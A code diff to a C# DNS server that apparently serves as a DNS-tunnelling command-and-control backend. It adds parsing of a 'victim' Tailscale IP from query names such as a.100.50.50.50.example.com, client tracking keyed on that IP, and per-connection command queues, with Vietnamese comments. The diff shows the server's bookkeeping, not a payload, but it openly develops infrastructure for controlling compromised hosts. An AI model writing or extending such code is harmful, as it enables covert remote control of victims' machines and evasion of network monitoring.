@@ -49,10 +49,12 @@ namespace Server.Logic
 
             try
             {
-                _udpServer = new UdpClient(port);
+                // Bind to specific IP address instead of 0.0.0.0
+                IPEndPoint localEndPoint = new IPEndPoint(IPAddress.Parse(_serverIp), port);
+                _udpServer = new UdpClient(localEndPoint);
                 _isRunning = true;
 
-                LogMessage($"[Started] Authoritative DNS Server listening on port {port}");
+                LogMessage($"[Started] Authoritative DNS Server listening on {_serverIp}:{port}");
                 LogMessage($"[Domain] {_domain}");
                 LogMessage($"[Server IP] {_serverIp}");
                 LogMessage($"[Logs] {Path.GetFullPath(logPath)}");
@@ -92,6 +94,7 @@ namespace Server.Logic
                 try
                 {
                     var result = await _udpServer.ReceiveAsync();
+                    LogMessage($"[DEBUG] Received {result.Buffer.Length} bytes from {result.RemoteEndPoint}");
                     _ = Task.Run(() => ProcessQuery(result.Buffer, result.RemoteEndPoint));
                 }
                 catch (Exception ex)
@@ -125,19 +128,45 @@ namespace Server.Logic
                     {
                         LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                         
+                        // Parse victim IP from query: a.[IP].domain.com
+                        // Format: a.100.50.50.50.example.com
+                        string[] queryParts = queryName.Split('.');
+                        string victimIP = remoteEP.Address.ToString(); // Default fallback
+                        
+                        if (queryParts.Length >= 6) // a + 4 octets + domain parts
+                        {
+                            // Reconstruct IP: parts[1].parts[2].parts[3].parts[4]
+                            string parsedIP = $"{queryParts[1]}.{queryParts[2]}.{queryParts[3]}.{queryParts[4]}";
+                            
+                            // Validate IP format
+                            if (System.Net.IPAddress.TryParse(parsedIP, out _))
+                            {
+                                victimIP = parsedIP;
+                                LogMessage($"[Connect] Victim Tailscale IP: {victimIP}");
+                            }
+                            else
+                            {
+                                LogMessage($"[Warning] Invalid IP in query, using DNS resolver IP: {victimIP}");
+                            }
+                        }
+                        else
+                        {
+                            LogMessage($"[Warning] Old format query, using DNS resolver IP: {victimIP}");
+                        }
+                        
                         // Kiem tra client da ton tai theo IP
-                        int existingId = _clientManager.GetConnectionIdByIp(remoteEP.Address.ToString());
+                        int existingId = _clientManager.GetConnectionIdByIp(victimIP);
                         int connectionId;
                         
                         if (existingId > 0)
                         {
-                            LogMessage($"[Connect] Client already exists with ID #{existingId}");
+                            LogMessage($"[Connect] Existing client ID #{existingId}");
                             connectionId = existingId;
                         }
                         else
                         {
-                            LogMessage($"[Connect] Starting connection #{_clientManager.ClientCount + 1}");
-                            connectionId = _clientManager.AddClient(remoteEP.Address.ToString());
+                            LogMessage($"[Connect] New client #{_clientManager.ClientCount + 1}");
+                            connectionId = _clientManager.AddClient(victimIP);
                             
                             // Khoi tao command queue cho ket noi nay
                             lock (_commandQueues)
